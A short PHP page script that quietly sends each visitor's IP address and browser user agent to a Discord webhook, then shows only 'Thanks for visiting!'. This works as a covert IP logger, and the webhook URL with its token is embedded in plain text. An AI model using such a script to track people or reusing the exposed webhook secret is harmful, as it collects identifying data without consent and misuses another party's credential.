<?php
$webhook = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H";

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

$data = [
    "content" => "Visitor IP: $ip\nUser Agent: $userAgent"
];

$options = [
    "http" => [
        "header"  => "Content-Type: application/json\r\n",
        "method"  => "POST",
        "content" => json_encode($data),
    ]
];

$context  = stream_context_create($options);
$result = file_get_contents($webhook, false, $context);

echo "Thanks for visiting!";
?>
